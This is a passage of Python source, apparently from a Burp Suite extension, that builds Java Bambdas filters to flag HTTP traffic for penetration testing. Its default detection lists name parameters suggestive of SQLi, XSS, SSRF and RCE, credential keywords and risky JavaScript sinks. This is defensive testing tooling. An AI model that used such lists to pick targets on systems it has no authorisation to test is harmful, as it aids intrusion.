        bambdas += "}\n"
        bambdas += "// Reset mode: clear all highlights and notes, then exit.\n\n"
        
        bambdas += "// Display window (days): ignore items older than the selected number of days\n"
        bambdas += "if (!requestResponse.time().isAfter(ZonedDateTime.now().minusDays(" + self._cbBambdasDisplayDays.getSelectedItem().split()[0] + ")))\n"
        bambdas += "    return false;\n\n"

        if self._cbBambdasScope.isSelected():
            bambdas += "// Display only items that are in scope and have a response.\n"
            bambdas += "if (!requestResponse.hasResponse() || !requestResponse.request().isInScope())\n"
        else:
            bambdas += "// Display only items that have a response\n"
            bambdas += "if (!requestResponse.hasResponse())\n"
        bambdas += "    return false;\n\n"

        if self._cbBambdasHTTPMethods.isSelected():
            httpMethods = "{"
            for httpMtd in [httpMtd.strip() for httpMtd in self._txtBambdasHTTPMethods.text.strip().split(',')]:
                if httpMtd:
                    httpMethods += "\"" + httpMtd + "\", "
            if httpMethods != "{":
                httpMethods = httpMethods[:-2] 
            httpMethods += "}"
            bambdas += "// HTTP methods to ignore\n"
            bambdas += "String[] httpMethods = " + httpMethods + ";"
            bambdas +="""
for (String httpMethod : httpMethods)
    if (requestResponse.request().method().equalsIgnoreCase(httpMethod))
        return false;
// HTTP methods to ignore\n
"""

        bambdas += "// General vars\n"
        bambdas += "boolean suspiciousHit = false;\n"
        bambdas += "boolean matchedScope = false;\n"
        bambdas += "boolean matchedDone = false;\n"
        bambdas += "StringBuilder notesBuilder = new StringBuilder();\n"
        if self._cbBambdasSearchinRes.isSelected() and (self._cbBambdasSearchHTMLComments.isSelected() or self._cbBambdasFilesDownloadable.isSelected() or self._cbBambdasValuable.isSelected() or self._cbBambdasVulnJS.isSelected()):
            bambdas += """String responseBody = requestResponse.response().bodyToString();
StringBuilder headersString = new StringBuilder();
boolean isDownloadHeaderPresent = false;
List<HttpHeader> responseHeaders = requestResponse.response().headers();
for (HttpHeader header : responseHeaders) {
    if (header.name().equalsIgnoreCase("Content-Disposition"))
        isDownloadHeaderPresent = true;
    headersString.append(header.name()).append(": ").append(header.value()).append("\\n");
}
String responseHeader = isDownloadHeaderPresent ? headersString.toString() : "";
"""
        if (self._cbBambdasSearchinReq.isSelected() or self._cbBambdasSearchinURL.isSelected()) and (self._cbBambdasSQLi.isSelected() or self._cbBambdasXSS.isSelected() or self._cbBambdasLFI.isSelected() or self._cbBambdasSSRF.isSelected() or self._cbBambdasORed.isSelected() or self._cbBambdasRCE.isSelected() or self._cbBambdasValuable.isSelected()):
            bambdas += "String requestBody  = requestResponse.request().bodyToString();\n"
        bambdas += "var path = requestResponse.request().path().toLowerCase();\n"
        bambdas += "var pathExt = requestResponse.request().pathWithoutQuery().toLowerCase();\n"
        bambdas += "// General vars\n\n"

        if self._tbBambdasBlackListedURLs.getText() != '/' and self._tbBambdasBlackListedURLs.getText().strip() and self._tbBambdasBlackListedURLs.getText() != self._txBambdasBlackListedURLs:
            bambdas += "// Apply blacklist to skip unwanted URLs\n"
            bambdas += "for (String targetPath : targetBlackListUrls)\n"
            bambdas += "    if (targetPath != null && !targetPath.trim().isEmpty() && Pattern.compile(targetPath, Pattern.CASE_INSENSITIVE).matcher(path).find())\n"
            bambdas += "        return false;\n"
            bambdas += "// Apply blacklist to skip unwanted URLs\n\n"

        if self._cbBambdasExtIgnore.isSelected():
            filterDenyList = ""
            for ext in [ext.strip() for ext in self._txtBambdasExtIgnoreKeywords.text.split(',')]:
                filterDenyList += "|" + ext;
            if filterDenyList[1:]:
                bambdas += "// Ignore static asset extensions to reduce noise.\n"
                bambdas += "if (Pattern.compile(\"\\\\.(" + filterDenyList[1:] + ")$\", Pattern.CASE_INSENSITIVE).matcher(pathExt).find())\n"
                bambdas += "    return false;\n"
                bambdas += "// Ignore static asset extensions to reduce noise.\n\n"

        bambdas += "// Processing window (days): only analyze items newer than this threshold\n"
        bambdas += "if (requestResponse.time().isAfter(ZonedDateTime.now().minusDays(" + self._cbBambdasProcessDays.getSelectedItem().split()[0] + "))){\n"

        if (self._cbBambdasSearchinReq.isSelected() or self._cbBambdasSearchinURL.isSelected()) and (self._cbBambdasSQLi.isSelected() or self._cbBambdasXSS.isSelected() or self._cbBambdasLFI.isSelected() or self._cbBambdasSSRF.isSelected() or self._cbBambdasORed.isSelected() or self._cbBambdasRCE.isSelected()):
            bambdas += "\t// Suspicious parameter registry per attack type\n"
            bambdas += "\n\tMap<String, List<String>> attacksKeyWords = new HashMap<>();\n"
            bambdas += "\tString[] paramsArray;\n"
            bambdas += "\tList<String> paramsArrayTrimmed = new ArrayList<>();\n\n"
        
            if self._cbBambdasSQLi.isSelected():
                bambdas += "\t// SQLi indicator parameter names\n"
                bambdas += "\tparamsArrayTrimmed = new ArrayList<>();\n"
                bambdas += "\tString textSQLi = \"" + self._txtBambdasSQLiKeywords.text.strip() + "\";\n"
                bambdas += "\tparamsArray = textSQLi.split(\",\\s*\");\n"
                bambdas += "\tfor (String paramArray : paramsArray)\n"
                bambdas += "\t\tif(!paramArray.trim().isEmpty())\n"
                bambdas += "\t\t\tparamsArrayTrimmed.add(paramArray.trim());\n"
                bambdas += "\tattacksKeyWords.put(\"SQLi\", new ArrayList<>(paramsArrayTrimmed));\n\n"

            if self._cbBambdasXSS.isSelected():
                bambdas += "\t// XSS indicator parameter names\n"
                bambdas += "\tparamsArrayTrimmed = new ArrayList<>();\n"
                bambdas += "\tString textXSS = \"" + self._txtBambdasXSSKeywords.text.strip() + "\";\n"
                bambdas += "\tparamsArray = textXSS.split(\",\\s*\");\n"
                bambdas += "\tfor (String paramArray : paramsArray)\n"
                bambdas += "\t\tif(!paramArray.trim().isEmpty())\n"
                bambdas += "\t\t\tparamsArrayTrimmed.add(paramArray.trim());\n"
                bambdas += "\tattacksKeyWords.put(\"XSS\", new ArrayList<>(paramsArrayTrimmed));\n\n"

            if self._cbBambdasLFI.isSelected():
                bambdas += "\t// LFI indicator parameter names (file/path handling)\n"
                bambdas += "\tparamsArrayTrimmed = new ArrayList<>();\n"
                bambdas += "\tString textLFI = \"" + self._txtBambdasLFIKeywords.text.strip() + "\";\n"
                bambdas += "\tparamsArray = textLFI.split(\",\\s*\");\n"
                bambdas += "\tfor (String paramArray : paramsArray)\n"
                bambdas += "\t\tif(!paramArray.trim().isEmpty())\n"
                bambdas += "\t\t\tparamsArrayTrimmed.add(paramArray.trim());\n"
                bambdas += "\tattacksKeyWords.put(\"LFI\", new ArrayList<>(paramsArrayTrimmed));\n\n"

            if self._cbBambdasSSRF.isSelected():
                bambdas += "\t// SSRF indicator parameter names (URLs/redirects)\n"
                bambdas += "\tparamsArrayTrimmed = new ArrayList<>();\n"
                bambdas += "\tString textSSRF = \"" + self._txtBambdasSSRFKeywords.text.strip() + "\";\n"
                bambdas += "\tparamsArray = textSSRF.split(\",\\s*\");\n"
                bambdas += "\tfor (String paramArray : paramsArray)\n"
                bambdas += "\t\tif(!paramArray.trim().isEmpty())\n"
                bambdas += "\t\t\tparamsArrayTrimmed.add(paramArray.trim());\n"
                bambdas += "\tattacksKeyWords.put(\"SSRF\", new ArrayList<>(paramsArrayTrimmed));\n\n"

            if self._cbBambdasORed.isSelected():
                bambdas += "\t// Open Redirect indicator parameter names\n"
                bambdas += "\tparamsArrayTrimmed = new ArrayList<>();\n"
                bambdas += "\tString textOR = \"" + self._txtBambdasORedKeywords.text.strip() + "\";\n"
                bambdas += "\tparamsArray = textOR.split(\",\\s*\");\n"
                bambdas += "\tfor (String paramArray : paramsArray)\n"
                bambdas += "\t\tif(!paramArray.trim().isEmpty())\n"
                bambdas += "\t\t\tparamsArrayTrimmed.add(paramArray.trim());\n"
                bambdas += "\tattacksKeyWords.put(\"OpenRedirect\", new ArrayList<>(paramsArrayTrimmed));\n\n"

            if self._cbBambdasRCE.isSelected():
                bambdas += "\t// RCE - command-execution indicator parameter names\n"
                bambdas += "\tparamsArrayTrimmed = new ArrayList<>();\n"
                bambdas += "\tString textRCE = \"" + self._txtBambdasRCEKeywords.text.strip() + "\";\n"
                bambdas += "\tparamsArray = textRCE.split(\",\\s*\");\n"
                bambdas += "\tfor (String paramArray : paramsArray)\n"
                bambdas += "\t\tif(!paramArray.trim().isEmpty())\n"
                bambdas += "\t\t\tparamsArrayTrimmed.add(paramArray.trim());\n"
                bambdas += "\tattacksKeyWords.put(\"RCE\", new ArrayList<>(paramsArrayTrimmed));\n\n"

            bambdas += "\t// End suspicious parameter registry\n\n"
        
        if self._cbBambdasValuable.isSelected() and (self._cbBambdasSearchinReq.isSelected() or self._cbBambdasSearchinRes.isSelected() or self._cbBambdasSearchinURL.isSelected()):
            bambdas += "\t// High-value keywords to search\n"
            highValueWords = "{"
            for valueWords in [valueWords.strip() for valueWords in self._txtBambdasValuable.text.strip().split(',')]:
                if valueWords:
                    highValueWords += "\"" + valueWords + "\", "
            if highValueWords != "{":
                highValueWords = highValueWords[:-2] 
            highValueWords += "}"
            bambdas += "\tString[] highValueWords = " + highValueWords + ";\n"
            bambdas += "\t// High-value keywords to search\n\n"

        if self._cbBambdasSearchinRes.isSelected():
            if self._cbBambdasVulnJS.isSelected():
                vulnJSFunc = "{"
                for vulnJS in [vulnJS.strip() for vulnJS in self._txtBambdasVulnJSKeywords.text.strip().replace(".","\\\\.").replace("(","\\\\(").split(',')]:
                    if vulnJS:
                        vulnJSFunc += "\"" + vulnJS + "\", "
                if vulnJSFunc != "{":
                    vulnJSFunc = vulnJSFunc[:-2] 
                vulnJSFunc += "}"
                bambdas += "\t// Potentially risky JavaScript functions to look for in responses\n"
                bambdas += "\tString[] suspiciousFunctions = " + vulnJSFunc + ";\n"
                bambdas += "\t// Potentially risky JavaScript functions to look for in responses\n\n"

            if self._cbBambdasFilesDownloadable.isSelected():
                fileExtensions = "{"
                for ext in [ext.strip() for ext in self._txtBambdasFilesDownloadable.text.strip().split(',')]:
                    if ext:
                        fileExtensions += "\"" + ext + "\", "
                if fileExtensions != "{":
                    fileExtensions = fileExtensions[:-2] 
                fileExtensions += "}"
                bambdas += "\t// Potentially downloadable file extensions\n"
                bambdas += "\tString[] fileExtensions = " + fileExtensions + ";\n"
                bambdas += "\t// Potentially downloadable file extensions\n\n"
                
        if self._cbBambdasValuable.isSelected() and (self._cbBambdasSearchinReq.isSelected() or self._cbBambdasSearchinRes.isSelected() or self._cbBambdasSearchinURL.isSelected()):
            bambdas += """
    List<Pattern> patterns = new ArrayList<>();
    for (String highValueWord : highValueWords)
        patterns.add(Pattern.compile(highValueWord, Pattern.CASE_INSENSITIVE));
"""
            if self._cbBambdasSearchinRes.isSelected():
                bambdas += """
    // High-value keyword - from response body
    for (Pattern pattern : patterns)
        if (pattern.matcher(responseBody).find()){
            suspiciousHit = true;
            if (notesBuilder.length() > 0)
                notesBuilder.append(", ");
            notesBuilder.append(pattern + " (ValuableWord-Res)");
        }
"""
            if self._cbBambdasSearchinReq.isSelected():
                bambdas += """
    // High-value keyword - from request body
    for (Pattern pattern : patterns)
        if (pattern.matcher(requestBody).find()){
            suspiciousHit = true;
            if (notesBuilder.length() > 0)
                notesBuilder.append(", ");
            notesBuilder.append(pattern + " (ValuableWord-Req)");
        }
"""
            if self._cbBambdasSearchinURL.isSelected():
                bambdas += """
    // High-value keyword - from URL
    for (Pattern pattern : patterns)
        if (pattern.matcher(path).find()){
            suspiciousHit = true;
            if (notesBuilder.length() > 0)
                notesBuilder.append(", ");
            notesBuilder.append(pattern + " (ValuableWord-URL)");
        }
"""
        if self._cbBambdasSearchinRes.isSelected():
            if not self._cbBambdasValuable.isSelected():
                bambdas += "\tList<Pattern> patterns = new ArrayList<>();"

            if self._cbBambdasFilesDownloadable.isSelected():
                bambdas += """
    // Potential downloads referenced in the response (by extension match)
    patterns = new ArrayList<>();
    for (String ext : fileExtensions)
        patterns.add(Pattern.compile("[\\\\s/>]?[^\\"'\\\\s<>]+\\\\." + ext + "(?=[\\\\s\\"])", Pattern.CASE_INSENSITIVE));
    
    ArrayList<String> matchingFiles = new ArrayList<>();
    // Scan response for suspected downloadable files
    List<String> sourcesToCheck = Arrays.asList(responseBody, responseHeader);
    for (String source : sourcesToCheck) {
        if (!source.isEmpty()) { 
            for (Pattern pattern : patterns) {
                Matcher matcher = pattern.matcher(source);
                while (matcher.find()) {
                    suspiciousHit = true;
                    String matchingFile = matcher.group();
                    matchingFiles.add(matchingFile);
                    if (notesBuilder.length() > 0)
                        notesBuilder.append(", ");
                    notesBuilder.append(matchingFile.strip().replace(">", "").replace("\\"", "")).append(" (Potential-FileDownload)");
                }
            }
        }
    }
"""
            if self._cbBambdasSearchHTMLComments.isSelected():
                bambdas += """
    // HTML comments in response
    patterns = new ArrayList<>();
    patterns.add(Pattern.compile(\"<!--.*?-->\", Pattern.DOTALL));
    ArrayList<String> matchingComments = new ArrayList<>();
    for (Pattern pattern : patterns) {
        Matcher matcher = pattern.matcher(responseBody);
        while (matcher.find()) {
            suspiciousHit = true;
            String matchingComment = matcher.group();
            matchingComments.add(matchingComment);
            if (notesBuilder.length() > 0)
                notesBuilder.append(\", \");
            notesBuilder.append(matchingComment).append(\" (HTML-Comment)\");
        }
    }
"""

            if self._cbBambdasVulnJS.isSelected():
                bambdas += """
    // Potentially risky JavaScript functions observed in the response
    patterns = new ArrayList<>();
    for (String suspiciousFunction : suspiciousFunctions)
        patterns.add(Pattern.compile(suspiciousFunction, Pattern.CASE_INSENSITIVE));
    
    for (Pattern pattern : patterns) {
        if (pattern.matcher(responseBody).find()){
                suspiciousHit = true;
                if (notesBuilder.length() > 0)
                    notesBuilder.append(", ");
                notesBuilder.append(pattern.toString().replace("\\\\", "")  + " - (VulnJSFunc)");
            }
        }
"""
        if (self._cbBambdasSearchinURL.isSelected() or self._cbBambdasSearchinReq.isSelected()) and (self._cbBambdasSQLi.isSelected() or self._cbBambdasXSS.isSelected() or self._cbBambdasLFI.isSelected() or self._cbBambdasSSRF.isSelected() or self._cbBambdasORed.isSelected() or self._cbBambdasRCE.isSelected()):
            if not self._cbBambdasValuable.isSelected() and not self._cbBambdasSearchinRes.isSelected():
                bambdas += "\tList<Pattern> patterns = new ArrayList<>();"

            bambdas += """
    // Parameter-based indicators across URL/query and request body
    for (Map.Entry<String, List<String>> entry : attacksKeyWords.entrySet()) {
        String attackType = entry.getKey();
        List<String> attackParams = entry.getValue();
        boolean htmlContent = false;
        patterns = new ArrayList<>();
        if (requestBody.startsWith("<"))
            // xml body
            for (String attackParam : attackParams)
                patterns.add(Pattern.compile("<" + attackParams + ">", Pattern.CASE_INSENSITIVE));
        else if (requestBody.startsWith("[{") || requestBody.startsWith("{"))
            // json body
            for (String attackParam : attackParams)
                patterns.add(Pattern.compile("\\\"" + attackParam + "\\\"", Pattern.CASE_INSENSITIVE));
        else {
            // regular html
            htmlContent = true;
            for (String attackParam : attackParams)
                patterns.add(Pattern.compile(attackParam, Pattern.CASE_INSENSITIVE));
            }

        if (htmlContent)
            // regular html
            for (String attackParam : attackParams){
"""
            if self._cbBambdasSearchinURL.isSelected():
                bambdas += """
                if (requestResponse.request().hasParameter(attackParam, HttpParameterType.URL)){
                    suspiciousHit = true;
                    if (notesBuilder.length() > 0)
                        notesBuilder.append(", ");
                    notesBuilder.append(attackParam + " (" + attackType + "-URL param)");
                }
"""
            if self._cbBambdasSearchinReq.isSelected():
                bambdas += """
                if (requestResponse.request().hasParameter(attackParam, HttpParameterType.BODY)){
                    suspiciousHit = true;
                    if (notesBuilder.length() > 0)
                        notesBuilder.append(", ");
                    notesBuilder.append(attackParam + " (" + attackType + "-Req param)");
                }
"""
            bambdas += "\t\t\t}\n"
                
            if self._cbBambdasSearchinReq.isSelected():
                bambdas += """
        else
            // xml or json
            for (Pattern pattern : patterns)
                if (pattern.matcher(requestBody).find()){
                    suspiciousHit = true;
                    if (notesBuilder.length() > 0)
                        notesBuilder.append(", ");
                    notesBuilder.append(pattern.toString().replace("\\\\", "") + " (" + attackType + "-Req param)");
                }
"""
            bambdas +="\n\t}\n\t// End parameter-based indicators\n"

        if (self._cbBambdasSearchinURL.isSelected() or self._cbBambdasSearchinReq.isSelected() or self._cbBambdasSearchinRes.isSelected()) and (self._cbBambdasSQLi.isSelected() or self._cbBambdasXSS.isSelected() or self._cbBambdasLFI.isSelected() or self._cbBambdasSSRF.isSelected() or self._cbBambdasORed.isSelected() or self._cbBambdasRCE.isSelected() or self._cbBambdasSearchHTMLComments.isSelected() or self._cbBambdasFilesDownloadable.isSelected() or self._cbBambdasVulnJS.isSelected() or self._cbBambdasValuable.isSelected()):
            bambdas +="\n\t// Apply highlight and add a consolidated \"Suspicious:\" note if any hit was found\n"
            bambdas += "\tif (suspiciousHit) {\n"
            bambdas += "\t\trequestResponse.annotations().setHighlightColor(HighlightColor."+ self._cbBambdasColorKeyWords.getSelectedItem() + ");\n"
            bambdas += """
        if (notesBuilder.length() > 0)
            requestResponse.annotations().setNotes("Suspicious: " + notesBuilder.toString());
        }
"""
        bambdas += """
    // clear notes and colors if no match
    if (!suspiciousHit){
            requestResponse.annotations().setHighlightColor(HighlightColor.NONE);
            requestResponse.annotations().setNotes("");
    }

    // Highlight items that match testing scope
    for (String targetPath : targetPaths)
        if (Pattern.compile(targetPath, Pattern.CASE_INSENSITIVE).matcher(path).find() && targetPath != null && !targetPath.trim().isEmpty()"""     
        if self._cbBambdasColorScope.getSelectedIndex() == 0:
            bambdas += " && (requestResponse.annotations().highlightColor() == HighlightColor.NONE)"
        bambdas += "){\n"
        bambdas += "\t\t\trequestResponse.annotations().setHighlightColor(HighlightColor."+ self._cbBambdasColorScope.getSelectedItem() + ");\n\t\t\tmatchedScope = true;\n\t\t\tbreak;\n\t\t\t}\n"

        bambdas += """
    // Highlight items already marked as tested
    for (String targetPath : targetPathsDone)
        if (Pattern.compile(targetPath, Pattern.CASE_INSENSITIVE).matcher(path).find() && targetPath != null && !targetPath.trim().isEmpty()"""
        if self._cbBambdasColorScopeSecondary.getSelectedIndex() == 0:
            bambdas += " && (requestResponse.annotations().highlightColor() == HighlightColor.NONE)"
        bambdas += "){\n"
        bambdas += "\t\t\trequestResponse.annotations().setHighlightColor(HighlightColor."+ self._cbBambdasColorScopeSecondary.getSelectedItem() + ");\n\t\t\tmatchedDone = true;\n\t\t\tbreak;\n\t\t}\n}\n// End processing window"

        bambdas += """
// clear anything outside of processing window
else {
    requestResponse.annotations().setHighlightColor(HighlightColor.NONE);
    requestResponse.annotations().setNotes("");
}
"""
        if self._tbBambdasBlackListedURLs.getText() == '/':
            bambdas += """
// Root blacklist (/) selected: ignore everything unless a matching criterion is found (scope, tested, or suspicious flags)."
if (!suspiciousHit && !matchedScope && !matchedDone)
    return false;
"""
        bambdas += "\nreturn true;"

        allUrls = False
        allUrlsBlacklisted = False
        if sum(1 for line in self._tbBambdasScopeURLs.text.splitlines() if line.strip() == '/') == 1 or self._tbBambdasScopeURLs.text == self._txBambdasScopeURLs or self._tbBambdasScopeURLs.text.strip() == "":
            allUrls = True
        if sum(1 for line in self._tbBambdasBlackListedURLs.text.splitlines() if line.strip() == '/') == 1:
            allUrlsBlacklisted = True

        self._lblBambdasNotification2.setForeground(Color.black)
        if allUrls:
            self._lblBambdasNotification2.text = "The script has been generated and copied to the clipboard. It includes all endpoints, with '"  + str(sum(1 for line in self._tbBambdasScopeDoneURLs.text.splitlines() if line.strip().startswith('/'))) + "' tested, and '" + str(sum(1 for line in self._tbBambdasBlackListedURLs.text.splitlines() if line.strip().startswith('/'))) + "' blacklisted."
        else:
            if allUrlsBlacklisted:
                self._lblBambdasNotification2.text = "The script has been generated and copied to the clipboard. It includes '" + str(sum(1 for line in self._tbBambdasScopeURLs.text.splitlines() if line.strip().startswith('/'))) + "' scoped, and '" + str(sum(1 for line in self._tbBambdasScopeDoneURLs.text.splitlines() if line.strip().startswith('/'))) + "' tested endpoints - the rest are hidden."
            else:
                self._lblBambdasNotification2.text = "The script has been generated and copied to the clipboard. It includes '" + str(sum(1 for line in self._tbBambdasScopeURLs.text.splitlines() if line.strip().startswith('/'))) + "' scoped, '" + str(sum(1 for line in self._tbBambdasScopeDoneURLs.text.splitlines() if line.strip().startswith('/'))) + "' tested, and '" + str(sum(1 for line in self._tbBambdasBlackListedURLs.text.splitlines() if line.strip().startswith('/'))) + "' blacklisted endpoints."

        self.updateBambdasScriptText(bambdas)

        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        clipboard.setContents(StringSelection(bambdas), None)

        return

    def updateBambdasScriptText(self, javaCode):

        doc = self._tbBambdasScript.getStyledDocument()
        processWhat = ""
        if javaCode.startswith("/*"):
            doc = self._tbBambdasScript.getStyledDocument()
            processWhat = "Bambdas"
        elif javaCode.startswith("metadata"):
            if javaCode.count("\n") > 3000:
                # do not color if more then 3000 lines
                self._tabDictResultDisplay.setText(javaCode)
                return
            doc = self._tabDictResultDisplay.getStyledDocument()
            processWhat = "Dict"
        else:
            # no match no coloring
            self._tabDictResultDisplay.setText(javaCode)
            return

        doc.remove(0, doc.getLength())

        # Define styles
        style_default = StyleContext.getDefaultStyleContext().getStyle(StyleContext.DEFAULT_STYLE)

        style_comment = doc.addStyle("comment", style_default)
        StyleConstants.setForeground(style_comment, Color(0, 150, 0))

        style_string = doc.addStyle("string", style_default)
        StyleConstants.setForeground(style_string, Color(0, 102, 204))

        style_annotation = doc.addStyle("annotation", style_default)
        StyleConstants.setForeground(style_annotation, Color(160, 100, 100))

        style_keyword = doc.addStyle("keyword", style_default)
        StyleConstants.setForeground(style_keyword, Color(153, 0, 153))

        style_normal = doc.addStyle("normal", style_default)
        StyleConstants.setForeground(style_normal, Color.BLACK)

        # Define regex patterns in priority order
        patterns = [
            (r'/\*[\s\S]*?\*/', style_comment),  # Multi-line comments
            (r'//.*', style_comment),            # Single-line comments
            (r'#.*', style_comment),             # Single-line comments
            (r'"(?:\\.|[^"\\])*"', style_string),# Strings
            (r'@\w+', style_annotation),         # Annotations
            (r'\b(?:if|else|for|String|return|true|false|then|end if|break|boolean|given|send)\b', style_keyword), # Selected keywords
        ]

        while javaCode:
            match_obj = None
            match_start = len(javaCode)
            match_end = len(javaCode)
            match_style = style_normal

            # Find earliest match
            for pattern, style in patterns:
                m = re.search(pattern, javaCode)
                if m and m.start() < match_start:
                    match_obj = m
                    match_start = m.start()
                    match_end = m.end()
                    match_style = style

            if match_obj:
                # Insert text before match (normal style)
                if match_start > 0:
                    doc.insertString(doc.getLength(), javaCode[:match_start], style_normal)

                # Insert matched text (styled)
                doc.insertString(doc.getLength(), javaCode[match_start:match_end], match_style)

                # Move past matched text
                javaCode = javaCode[match_end:]
            else:
                # No more matches, insert rest as normal
                doc.insertString(doc.getLength(), javaCode, style_normal)
                break

        # Scroll to top after inserting text
        if processWhat == "Bambdas":
            self._tbBambdasScript.setCaretPosition(0)
        elif processWhat == "Dict":
            self._tabDictResultDisplay.setCaretPosition(0)


    def funcBambdasUIReset(self, ev):
        self._lblBambdasNotification2.setForeground (Color.black)
        self._lblBambdasNotification2.text = "Click 'Run' to generate Bambdas Script!"
        self._cbBambdasColorScope.setSelectedIndex(7)
        self._cbBambdasforWhat.setSelectedIndex(0)
        self._cbBambdasColorScopeSecondary.setSelectedIndex(9)
        self._cbBambdasColorKeyWords.setSelectedIndex(0)
        self._cbBambdasDisplayDays.setSelectedIndex(5)
        self._cbBambdasProcessDays.setSelectedIndex(5)
        self._tbBambdasScopeURLs.setText(self._txBambdasScopeURLs)
        self._tbBambdasScopeDoneURLs.setText(self._txBambdasScopeDoneURLs)
        self._tbBambdasBlackListedURLs.setText(self._txBambdasBlackListedURLs)
        self._tbBambdasScopeURLs.setForeground(Color.GRAY)
        self._tbBambdasScopeDoneURLs.setForeground(Color.GRAY)
        self._tbBambdasBlackListedURLs.setForeground(Color.GRAY)
        self.updateBambdasScriptText("/* Bambdas Script will be in here automatically */")
        self._cbBambdasScope.setSelected(False)
        self._cbBambdasExtIgnore.setSelected(True)
        self._cbBambdasDisplayDays.setEnabled(True)
        self._cbBambdasProcessDays.setEnabled(True)
        self._cbBambdasSearchinReq.setSelected(False)
        self._cbBambdasSearchinRes.setSelected(False)
        self._cbBambdasSearchinURL.setSelected(False)
        
        self._cbBambdasSearchHTMLComments.setSelected(False)
        
        self._txtBambdasExtIgnoreKeywords.text = "js, gif, jpg, png, svg, css, ico, woff, woff2"
        self._txtBambdasExtIgnoreKeywords.setEnabled(True)
        self._cbBambdasExtIgnore.setSelected(True)

        self._txtBambdasHTTPMethods.text = "HEAD, OPTIONS"
        self._txtBambdasHTTPMethods.setEnabled(True)
        self._cbBambdasHTTPMethods.setSelected(True)
        
        self._txtBambdasValuable.text = "debug, admin, config, secret, token, password, hash, credential"
        self._txtBambdasValuable.setEnabled(False)
        self._cbBambdasValuable.setSelected(False)

        self._txtBambdasFilesDownloadable.text = "back, backup, bak, bin, cache, conf, config, csv, doc, docx, gz, inc, ini, jar, log, old, pdf, ppt, pptx, rar, readme, tar, txt, xls, xlsx, zip, 7z"
        self._txtBambdasFilesDownloadable.setEnabled(False)
        self._cbBambdasFilesDownloadable.setSelected(False)

        self._txtBambdasSQLiKeywords.text = "category, id, item, message, name, news, page, password, q, query, report, s, search, thread, user, username, view"
        self._txtBambdasSQLiKeywords.setEnabled(False)
        self._cbBambdasSQLi.setSelected(False)

        self._txtBambdasXSSKeywords.text = "comment, content, description, id, key, keyword, keywords, l, lang, message, name, p, page, q, query, s, search, username"
        self._txtBambdasXSSKeywords.setEnabled(False)
        self._cbBambdasXSS.setSelected(False)

        self._txtBambdasLFIKeywords.text = "conf, content, detail, dir, doc, document, download, file, folder, inc, include, locate, page, path, show, template, url, view, read, load"
        self._txtBambdasLFIKeywords.setEnabled(False)
        self._cbBambdasLFI.setSelected(False)

        self._txtBambdasSSRFKeywords.text = "callback, dest, destination, host, next, out, path, redirect, return, site, target, to, uri, url, view"
        self._txtBambdasSSRFKeywords.setEnabled(False)
        self._cbBambdasSSRF.setSelected(False)

        self._txtBambdasORedKeywords.text = "dest, destination, go, next, out, redir, redirect, redirect_uri, redirect_url, return, return_path, return_to, returnTo, returnUrl, target, to, uri, url"
        self._txtBambdasORedKeywords.setEnabled(False)
        self._cbBambdasORed.setSelected(False)

        self._txtBambdasRCEKeywords.text = "arg, cmd, code, command, exe, exec, execute, ping, print, process, run"
        self._txtBambdasRCEKeywords.setEnabled(False)
        self._cbBambdasRCE.setSelected(False)

        self._txtBambdasVulnJSKeywords.text = "eval(, setTimeout(, setInterval(, document.write(, innerHTML, document.createElement(, document.execCommand(, document.domain, window.location.href, document.cookie, document.URL, document.referrer, window.open(, document.body.innerHTML, element.setAttribute(, element.outerHTML, XMLHttpRequest(, fetch(, navigator.sendBeacon("
        self._txtBambdasVulnJSKeywords.setEnabled(False)
        self._cbBambdasVulnJS.setSelected(False)

        self._cbBambdasSearchinReqFunc(self)
        self._cbBambdasSearchinResFunc(self)
        self._cbBambdasSearchinURLFunc(self)
        return


    def _tabBambdasUI(self):
        self._btnBambdasRun = JButton("               Run              ", actionPerformed=self.funcBambdasRun)
        self._btnBambdasRun.setToolTipText("Generate a Bambdas script based on the options below.")
        self._btnBambdasReset = JButton("               Reset              ", actionPerformed=self.funcBambdasUIReset)
        self._btnBambdasReset.setToolTipText("Clear all fields and restore default settings.")

        self._lblBambdasforWhat = JLabel("Bambdas script target")
        self._lblBambdasforWhat.setVisible(False)
        self._lblBambdasforWhat.setToolTipText("Select what this Bambdas script will operate on.")
        self._cbBambdasforWhat = JComboBox(('View filter - HTTP history', 'Capture Filter'))
        self._cbBambdasforWhat.setEnabled(False)
        
        self._lblBambdasScope = JLabel("Only process in-scope items")
        self._cbBambdasScope = JCheckBox('', False)
        self._lblBambdasScope.setToolTipText("Choose whether to show only items within the current project scope or all items.")
        self._cbBambdasScope.setToolTipText("Toggle to show only in-scope items or everything.")
        
        self._txtBambdasSearchHTMLCommnets = JTextField("The search will occur between the '<!--' and '-->' tags.", 100)
        self._txtBambdasSearchHTMLCommnets.setEnabled(False)
        self._cbBambdasSearchHTMLComments = JCheckBox('Search HTML comments', False)
        self._txtBambdasSearchHTMLCommnets.setToolTipText("Search HTML comments")
        self._cbBambdasSearchHTMLComments.setToolTipText("Search HTML comments")

        self._lblBambdasNotification1 = JLabel(" ")
        self._lblBambdasNotification2 = JLabel("Click 'Run' to generate Bambdas Script!")

        self._lblBambdasColorScope = JLabel("Color for testing scope")
        self._cbBambdasColorScope = JComboBox(('NONE', 'BLUE', 'CYAN', 'GRAY', 'GREEN', 'MAGENTA', 'ORANGE', 'PINK', 'RED', 'YELLOW'))
        self._lblBambdasColorScope.setToolTipText("Select the highlight color for testing scope.")
        self._cbBambdasColorScope.setToolTipText("Select the highlight color for testing scope.")
        
        self._lblBambdasColorScopeSecondary = JLabel("Color for tested URLs")
        self._cbBambdasColorScopeSecondary = JComboBox(('NONE', 'BLUE', 'CYAN', 'GRAY', 'GREEN', 'MAGENTA', 'ORANGE', 'PINK', 'RED', 'YELLOW'))
        self._cbBambdasColorScopeSecondary.setToolTipText("Select the highlight color for tested endpoints")
        self._lblBambdasColorScopeSecondary.setToolTipText("Select the highlight color for tested endpoints")

        self._lblBambdasColorKeyWords = JLabel("Color for parameters/keywords")
        self._cbBambdasColorKeyWords = JComboBox(('NONE', 'BLUE', 'CYAN', 'GRAY', 'GREEN', 'MAGENTA', 'ORANGE', 'PINK', 'RED', 'YELLOW'))
        self._lblBambdasColorKeyWords.setToolTipText("Select the highlight color when parameters or keywords match.")
        self._cbBambdasColorKeyWords.setToolTipText("Select the highlight color when parameters or keywords match.")
    
        self._lblBambdasSearchScope = JLabel("Keyword search location")
        self._lblBambdasSearchScope.setToolTipText("Choose where keywords should be searched.")
        self._cbBambdasSearchinURL = JCheckBox('in URL', False, itemStateChanged=self._cbBambdasSearchinURLFunc)
